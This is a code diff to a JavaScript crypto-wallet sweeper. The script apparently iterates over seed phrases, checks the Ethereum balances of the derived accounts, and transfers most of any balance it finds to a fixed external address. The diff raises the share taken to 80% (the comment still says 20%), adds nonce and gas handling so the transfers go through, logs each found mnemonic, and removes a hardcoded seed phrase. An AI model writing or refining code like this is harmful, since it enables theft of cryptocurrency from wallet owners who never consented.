@@ -11,22 +11,37 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
     {
         // get balance
         const brutBalance = await web3Provider.eth.getBalance(account);
-        const balance = web3Provider.utils.fromWei(brutBalance, 'ether');
+        const balance = await web3Provider.utils.fromWei(brutBalance, 'ether');
 
         // balance to transfer - 20% of the balance
-        const balanceToTransfer = balance * 0.2;
+        const balanceToTransfer = brutBalance * 0.8;
 
         // check if balance is greater than 0
         if (balance > 0)
         {
-            console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
-            console.log(`Mnemonic: ${_mnemonic}, Account: ${account}`);
+            console.log(`Wallet found! Balance: ${brutBalance} ETH on ${network}`);
+            console.log(`Mnemonic: ${_mnemonic}, Account: ${account}, index: ${accounts.indexOf(account)}`);
+
+            // fix nonce error
+            try
+            {
+                const NonceTrackerSubprovider = require("web3-provider-engine/subproviders/nonce-tracker");
+                const nonceTracker = new NonceTrackerSubprovider()
+                web3Provider.engine._providers.unshift(nonceTracker)
+                nonceTracker.setEngine(web3Provider.engine)
+            }
+            catch (error)
+            {
+                console.log('nonce', error);    
+            }
 
             // transfer funds to your wallet
+            let gasPrice = await web3Provider.eth.getGasPrice()
             const tx = await web3Provider.eth.sendTransaction({
                 from: account,
                 to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
-                value: balanceToTransfer
+                value: balanceToTransfer,
+                gasPrice: gasPrice,
             }).catch(err => console.log(err, _mnemonic, network));
 
             // log transaction
@@ -38,7 +53,7 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
     }
 }
 
-let mnemonic = "plate camera risk vanish skin stove people lunch ill invite employ unknown";
+let mnemonic = "";
 const main_function = async () =>
 {
     // infinite loop
